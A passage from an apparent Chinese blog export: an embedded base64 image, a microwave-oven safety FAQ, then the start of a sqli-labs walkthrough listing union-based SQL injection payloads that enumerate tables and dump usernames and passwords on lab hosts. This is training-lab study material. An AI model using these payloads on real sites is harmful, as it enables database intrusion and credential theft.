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"></p>              </div>            </details><h4 id="微波炉加热食物会产生致癌物质？"><a href="#微波炉加热食物会产生致癌物质？" class="headerlink" title="微波炉加热食物会产生致癌物质？"></a>微波炉加热食物会产生致癌物质？</h4><details ><summary> 点击查看答案 </summary>              <div class='content'>              <p>想知道是否致癌，得从微波炉加热的本质说起</p><p>微波炉加热的其实是食物中的水。当微波辐射到食品上时，水的极性分子的取向将随微波场而变动。由于食品中水的极性分子的这种运动，以及相邻分子间的相互作用，产生了焦耳热，从而加热食物，所以微波炉加热不会产生致癌物质</p><p><img src="https://tse3-mm.cn.bing.net/th/id/OIP-C.MaWsOVDOBoaHx1GHXuEeTwHaHa?w=192&h=191&c=7&r=0&o=5&dpr=1.5&pid=1.7" class="lazyload" data-srcset="https://tse3-mm.cn.bing.net/th/id/OIP-C.MaWsOVDOBoaHx1GHXuEeTwHaHa?w=192&h=191&c=7&r=0&o=5&dpr=1.5&pid=1.7" srcset="data:image/png;base64,666"></p>              </div>            </details><h4 id="微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？"><a href="#微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？" class="headerlink" title="微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？"></a>微波炉门的那块可视窗口部分有洞，会不会产生辐射呢？</h4><details ><summary> 点击查看答案 </summary>              <div class='content'>              <p>来人，上公式</p><p><a href="https://www.helloimg.com/image/Ga0UZo"><img src="https://www.helloimg.com/images/2021/12/01/Ga0UZo.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/01/Ga0UZo.png" srcset="data:image/png;base64,666" alt="Ga0UZo.png"></a></p><p>可以看出微波的波长大概在12cm左右，比微波炉门上的小洞直径大得多，微波根本出不来</p><p><a href="https://www.helloimg.com/image/Ga0fct"><img src="https://www.helloimg.com/images/2021/12/01/Ga0fct.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/01/Ga0fct.jpg" srcset="data:image/png;base64,666" alt="Ga0fct.jpg"></a></p>              </div>            </details><h4 id="微波炉加热的食品，会不会改变食品本身的营养成分？"><a href="#微波炉加热的食品，会不会改变食品本身的营养成分？" class="headerlink" title="微波炉加热的食品，会不会改变食品本身的营养成分？"></a>微波炉加热的食品，会不会改变食品本身的营养成分？</h4><details ><summary> 点击查看答案 </summary>              <div class='content'>              <p>我们要明白的是：任何形式的烹饪都会破坏食物中的营养成分，但关键的变量是烹饪中所用水的多少，烹饪的时间，以及温度。</p><p>正常的微波烹饪由于时间短，避免了传统烹饪中食物表面温度过高的弊端，油烟更少，所以产生的致癌物也更少。而且，在烹饪方法中，微波炉加热对食品营养成分的保护是属于比较好的，“能最大限度地保留食品的营养及原有的色香味”。</p>              </div>            </details><blockquote><p>资料参考：</p><p><a href="http://tech.sina.com.cn/e/2017-11-29/doc-ifypapmz6013246.shtml">求真测试：微波炉辐射大？比手机大多了|食品|微波炉|微波_新浪科技_新浪网 (sina.com.cn)</a></p><p><a href="https://post.smzdm.com/p/584186/">老爸评测：让我们谈谈关于微波炉的辐射问题_微波炉_什么值得买 (smzdm.com)</a></p><p>部分图源必应，侵删</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> other </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="2021/11/30/sqli-labs/"/>
      <url>2021/11/30/sqli-labs/</url>
      
        <content type="html"><![CDATA[<blockquote><p>用校园网可能不能成功发送payload，切记！！！</p></blockquote><a id="more"></a><h2 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h2><ul><li><p>先判断是字符型注入还是数字型注入</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9XGq.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9XGq.png" srcset="data:image/png;base64,666" alt="Ga9XGq.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1</a> and 1=2–+</em></strong></p><hr><ul><li><p>再判断注入点</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9m9b.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9m9b.png" srcset="data:image/png;base64,666" alt="Ga9m9b.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,2,3–+</em></strong></p><hr><ul><li><p>查看数据库名称</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9sko.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9sko.png" srcset="data:image/png;base64,666" alt="Ga9sko.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,database(),3–+</em></strong></p><hr><ul><li><p>查看库中的表</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9q0T.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9q0T.png" srcset="data:image/png;base64,666" alt="Ga9q0T.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+</em></strong></p><hr><ul><li><p>查看用户表中字段</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9e4r.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9e4r.png" srcset="data:image/png;base64,666" alt="Ga9e4r.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users”–+</em></strong></p><hr><ul><li><p>查看用户名和密码</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9JxK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9JxK.png" srcset="data:image/png;base64,666" alt="Ga9JxK.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(username,password),3 from security.users–+</em></strong></p><hr><ul><li><p>换个方式显示</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9xj1.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9xj1.png" srcset="data:image/png;base64,666" alt="Ga9xj1.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(username),group_concat(password) from security.users–+</em></strong></p><hr><h2 id="Less-02"><a href="#Less-02" class="headerlink" title="Less-02"></a>Less-02</h2><ul><li><p>判断是数字型注入还是字符型注入</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9MEE.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9MEE.png" srcset="data:image/png;base64,666"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1</a></em></strong></p><hr><ul><li><p>判断注入点</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9H0u.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9H0u.png" srcset="data:image/png;base64,666" alt="Ga9H0u.png"></p></li></ul><p><strong><em>payload：<a 